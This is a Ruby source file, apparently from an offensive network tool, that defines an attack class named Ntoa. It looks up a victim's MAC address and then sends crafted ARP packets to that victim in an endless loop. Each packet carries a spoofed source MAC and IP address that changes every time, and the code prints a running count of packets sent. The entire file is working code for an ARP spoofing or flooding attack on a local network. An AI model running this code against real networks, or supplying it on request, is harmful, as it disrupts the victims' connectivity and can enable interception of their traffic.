module Attack
  class Ntoa < Base

    def process
      victim_mac = PacketFu::Utils::arp(config.victim_ip, iface: config.interface)

      @a = 10
      @b = 10
      @c = 10
      @i = 0

      saddr = "00:03:FF:#{@a}:#{@b}:#{@c}"
      daddr = victim_mac
      saddr_ip = "10.188.#{@b}.#{@c}"
      daddr_ip =  config.victim_ip

      crafted_packet = ServiceObjects::CraftArpPacket.new(config, saddr, daddr, saddr_ip, daddr_ip)

      loop do
        while @a < 100 do
          @b = 10
          @a += 1
          while @b < 100 && @a < 100 do
            @c = 10
            @b += 1
            while @c < 100 && @b < 100 do
              @c += 1
              crafted_packet.eth_saddr =  "00:03:FF:#{@a}:#{@b}:#{@c}"
              crafted_packet.arp_saddr_mac = "#00:03:FF:#{@a}:#{@b}:#{@c}"
              crafted_packet.arp_saddr_ip = "10.188.#{(@b - 10) }.#{(@c - 10)}"
              crafted_packet.to_w(config.interface)
              @i += 1
              print "\r The ARP packet has been sent successfully #{@i} times"
              sleep config.delay
            end
          end
        end
      end
    end

  end
end
